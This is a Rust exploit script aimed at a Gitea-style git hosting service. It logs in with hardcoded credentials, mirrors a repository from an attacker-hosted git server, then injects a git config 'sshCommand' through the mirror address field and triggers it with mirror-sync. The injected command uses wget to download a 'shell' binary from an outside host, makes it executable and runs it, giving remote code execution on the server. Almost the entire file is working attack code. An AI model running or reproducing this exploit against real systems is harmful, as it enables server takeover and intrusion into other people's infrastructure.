use actix_files::Files;
use actix_web::{http, App, HttpServer, rt::{System, SystemRunner}};
use anyhow::{Result};
use rand::{distributions::Alphanumeric, thread_rng, Rng};
use regex::Regex;
use cookie::Cookie;
use reqwest::{cookie::CookieStore, cookie::Jar, Client, Response};
use std::{iter, path::Path, process::exit, sync::Arc, time::Duration};
use tokio::process::Command;
use url::Url;

#[tokio::main]
async fn main() -> Result<()> {
    let username = "test";
    let password = "password123";
    let host_addr = "192.168.4.2";
    let host_port: u16 = 3000;
    //remove trailing slashes
    let target_url = "https://192.168.4.1:3001".trim_end_matches("/").to_string();
    let cmd =
        "wget http://192.168.1.1:8080/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell";

    let http_timeout = Duration::from_secs(10);
    let cookie_store = Arc::new(Jar::default());
    let http_client = Client::builder()
        .timeout(http_timeout)
        .cookie_store(true)
        .cookie_provider(cookie_store.clone())
        .build()?;

    // FIRST WE LOG IN USING PSWD AND USERNAME INTO TARGET_URL //
    println!("Logging in");

    let body_uid_pwd = [("user_name", username), ("password", password)];
    let url_login = format!("{}/user/login", target_url);
    // let res_login: Response = http_client.post(url_login).form(&body_uid_pwd).send().await?;
    // if !res_login.status().is_success() {
    //     println!("Login unsuccessful.");
    //     exit(1);
    // }
    let res_login: Result<Response, reqwest::Error> = http_client.post(url_login).form(&body_uid_pwd).send().await;
    match res_login {
        Ok(response) => {
            if !response.status().is_success() {
                println!("Login unsuccessful. Status: {:?}", response.status());
                exit(1);
            }
        }
        Err(err) => {
            println!("Error sending request: {:?}", err);
            exit(1);
        }
    }

    println!("Logged in successfully!");

    // NEXT WE RETRIEVE THE USER ID FROM THE TARGET WE JUST LOGGED INTO //
    let res_user = http_client.get(format!("{}/", target_url)).send().await?;
    if !res_user.status().is_success() {
        println!("Could not retrieve user ID");
        exit(1);
    }
    let regexp_user_id =
        Regex::new(r#"<meta name="_uid" content="(.+)" />"#).expect("compiling regexp_res2");
    let body_res = res_user.text().await?;
    let mut regex_vec = regexp_user_id
        .captures_iter(&body_res)
        .filter_map(|captures| captures.get(0))
        .map(|captured| captured.as_str().to_string())
        .collect::<Vec<String>>();
    let user_id = regex_vec.remove(0);

    println!("the full vector of content is: {:?}", regex_vec);
    println!("body_res_user_id: {}", body_res);
    println!("Retrieved user ID: {}", &user_id);

    // NOW WE CREATE A TEMPORARY GIT DIRECTORY

    // It creates a temporary directory using the tempfile crate.
    // Initializes a Git repository in the temporary directory.
    // Configures Git with a user email and name.
    // Creates a file named "x" and commits it to the Git repository. 
    let git_temp_dir = tempfile::tempdir()?;
    exec_command("git", &["init"], git_temp_dir.path()).await?;
    exec_command("git", &["config", "user.email", "x@x.com"], git_temp_dir.path()).await?;
    exec_command("git", &["config", "user.name", "x"], git_temp_dir.path()).await?;
    exec_command("touch", &["x"], git_temp_dir.path()).await?;
    exec_command("git", &["add", "x"], git_temp_dir.path()).await?;
    exec_command("git", &["commit", "-m", "x"], git_temp_dir.path()).await?;

    let git_temp_path_str = git_temp_dir
        .path()
        .to_str()
        .expect("converting git_temp_path to &str");

    let git_temp_repo = format!("{}.git", git_temp_path_str);

    println!("git temp repo is: {}", git_temp_repo);

    //create bare clone of the git repo without files
    exec_command(
        "git",
        &["clone", "--bare", git_temp_path_str, git_temp_repo.as_str()],
        git_temp_dir.path(),
    ).await?;

    exec_command("git", &["update-server-info"], &git_temp_repo).await?;

    let endpoint = format!("{}:{}", &host_addr, host_port);

    //Start server to run asynchronously in the background using Tokio's runtime.
    tokio::task::spawn_blocking(move || {

        println!("Starting HTTP server");        
        let actix_system: SystemRunner = 
            actix_web::rt::System::with_tokio_rt(|| {
                tokio::runtime::Builder::new_multi_thread()
                    .enable_all()
                    .build()
                    .expect("building actix's web runtime")
            });

        actix_system.block_on(async move {
            HttpServer::new(move || {
                // the Actix Files::new("/static", ".") is telling
                // the server to serve files from the current directory 
                // under the path "/static". So, if you have a file named 
                // "example.html" in the current directory, it can
                // be accessed at http://hostname:port/static/example.html.
                App::new().service(Files::new("/static", ".").prefer_utf8(true))
            })
            .bind(endpoint)
            .expect("binding http server")
            .run()
            .await
            .expect("running http server")
        });
    });

    println!("Created temporary git server to host {}", &git_temp_repo);

    println!("Creating repository");
    //take care of cookies
    let cookies_url: Url = target_url.parse::<Url>().expect("parsing cookies url");
    let csrf_token = get_csrf_token(&cookie_store, &cookies_url)?;
    //create repo name
    let mut rng = thread_rng();
    let repo_name: String = iter::repeat(())
        .map(|()| rng.sample(Alphanumeric))
        .map(char::from)
        .take(8)
        .collect();
    //create clone addr str
    let clone_addr = format!(
        "http://{}:{}/{}.git",
        host_addr, host_port, git_temp_path_str);

    let body_create_repo = [
        ("_csrf", csrf_token.as_str()),
        ("uid", user_id.as_str()),
        ("repo_name", repo_name.as_str()),
        ("clone_addr", clone_addr.as_str()),
        ("mirror", "on"),
    ];

    let res_create_repo = http_client
        .post(format!("{}/repo/migrate", target_url))
        .form(&body_create_repo)
        .send()
        .await?;

    if !res_create_repo.status().is_success() {
        println!("Error creating repo");
        exit(1);
    }

    println!("Repo {} created!", &repo_name);

    println!("Injecting command into repo ;)");

    let command_to_inject = format!(
        r#"ssh://example.com/x/x"""\r\n[core]\r\nsshCommand="{}"\r\na=""""#, 
        cmd
    );
    let csrf_token = get_csrf_token(&cookie_store, &cookies_url)?;
    let body_injection = [
        ("_csrf", csrf_token.as_str()),
        ("mirror_address", command_to_inject.as_str()),
        ("action", "mirror"),
        ("enable_prune", "on"),
        ("interval", "8h0m0s"),
    ];

    let res_injection = http_client
        .post(format!("{}/{}/{}/settings",
        target_url, &username, &repo_name))
        .form(&body_injection)
        .send()
        .await?;
    if !res_injection.status().is_success() {
        println!("Failed to inject command");
        exit(1);
    }

    println!("Command successfully injected.");

    println!("Triggering command");
    let csrf_token = get_csrf_token(&cookie_store, &cookies_url)?;
    //the injected command is within mirror. lets trigger it
    let body_trigger_cmd = [
        ("_csrf", csrf_token.as_str()), ("action", "mirror-sync")
    ];
    let res_trigger_cmd = http_client
        .post(format!("{}/{}/{}/settings", target_url, &username, &repo_name))
        .form(&body_trigger_cmd)
        .send()
        .await?;
    if !res_trigger_cmd.status().is_success() {
        println!("Failed to trigger command");
        exit(0)
    }

    println!("Command successfully triggered");

    Ok(())
}

async fn exec_command(program: &str, args: &[&str], working_dir: impl AsRef<Path>) -> Result<()> {
    Command::new(program)
        .args(args)
        .current_dir(working_dir)
        .spawn()?
        .wait()
        .await?;

    Ok(())
}

fn get_csrf_token(cookies_jar: &Jar, cookies_url: &Url) -> Result<String, anyhow::Error> {

    let cookies = cookies_jar
        .cookies(cookies_url)
        .ok_or(anyhow::anyhow!("getting cookies from store"))?;
    
    let csrf_cookie = cookies
        .to_str()?
        .split("; ")
        .into_iter()
        .map(|cookie| cookie.trim())
        .filter_map(|cookie| Cookie::parse(cookie).ok())
        .filter(|cookie| cookie.name() == "_csrf")
        .next()
        .ok_or(anyhow::anyhow!("getting csrf cookie from store"))?;

    Ok(csrf_cookie.value().to_string())
    
}
